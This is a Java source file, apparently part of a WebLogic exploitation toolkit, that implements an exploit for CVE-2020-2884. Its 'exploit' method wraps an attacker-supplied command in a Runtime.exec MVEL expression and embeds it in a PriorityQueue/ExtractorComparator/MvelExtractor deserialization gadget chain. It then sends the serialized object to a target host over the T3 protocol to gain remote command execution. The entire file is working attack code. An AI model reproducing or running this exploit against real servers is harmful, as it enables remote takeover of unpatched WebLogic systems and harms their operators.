package org.weblogic.exploit;

import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import org.weblogic.exploit.annotation.Gadget;
import org.weblogic.serial.Reflections;
import org.weblogic.serial.Serializer;
import org.weblogic.weblogic.T3ProtocolOperation;

import java.util.PriorityQueue;

/*
CVE-2020-2884
PriorityQueue.readObject()
    ExtractorComparator.compare()
        MvelExtractor.extract()
            MVEL.compileExpression()
 */
@Gadget(cve = "CVE-2020-2884")
public class Coherence3 implements Exploit {
    @Override
    public void exploit(String host, String port, String command) throws Exception {
        String payload = "java.lang.Runtime.getRuntime().exec('" + command + "')";
        MvelExtractor extractor = new MvelExtractor(payload);
        ExtractorComparator comparator = new ExtractorComparator();
        Reflections.setFieldValue(comparator, "m_extractor", extractor);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, null);
        queue.add(1);
        queue.add(1);
        //add comparator for queue
        Reflections.setFieldValue(queue, "comparator", comparator);
        T3ProtocolOperation.send(host, port, Serializer.serialize(queue));
    }
}
